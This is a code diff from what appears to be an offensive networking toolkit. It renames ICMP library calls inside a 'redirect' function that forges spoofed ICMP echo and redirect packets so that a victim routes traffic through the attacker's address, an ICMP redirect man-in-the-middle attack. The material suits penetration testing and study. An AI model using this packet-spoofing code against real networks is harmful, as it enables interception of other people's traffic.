@@ -13,7 +13,7 @@ Example:
 
 """
 import socket, time, sys
-from agave.core import ip, icmp
+from agave.core import ip, icmpv4
 from agave.core.buffer import Buffer
 from ipaddress import IPv4Address
 
@@ -52,20 +52,20 @@ def redirect(
 	# Builds the packet
 	# 	Echo request sent by <target> to <victim>.
 	buf_1 = Buffer.from_bytes()
-	icmp_frame = icmp.ICMP.echo(b'abcdefghijklmnopqrstuvwyxz')
+	icmp_frame = icmpv4.ICMPv4.echo(b'abcdefghijklmnopqrstuvwyxz')
 	icmp_frame.set_checksum()
 	icmp_frame.write_to_buffer(buf_1)
 	target_req = ip.IPv4.create_message(victim, target, bytes(buf_1), ip.PROTO_ICMP)
 	# 	Guessed <victim> response to the echo request above.
 	buf_2 = Buffer.from_bytes()
-	icmp_frame = icmp.ICMP.reply(b'abcdefghijklmnopqrstuvwyxz')
+	icmp_frame = icmpv4.ICMPv4.reply(b'abcdefghijklmnopqrstuvwyxz')
 	icmp_frame.set_checksum()
 	icmp_frame.write_to_buffer(buf_2)
 	victim_res = ip.IPv4.create_message(target, victim, bytes(buf_2), ip.PROTO_ICMP)
 	# 	Malioucius redirect message from gateway.
 	buf_3 = Buffer.from_bytes()
-	icmp_frame = icmp.ICMP.redirect(
-		icmp.REDIRECT_CODE_HOST,
+	icmp_frame = icmpv4.ICMPv4.redirect(
+		icmpv4.REDIRECT_CODE_HOST,
 		attacker._ip, 				# address of the router to use instead
 		victim_res					# message that triggered the redirect
 	)
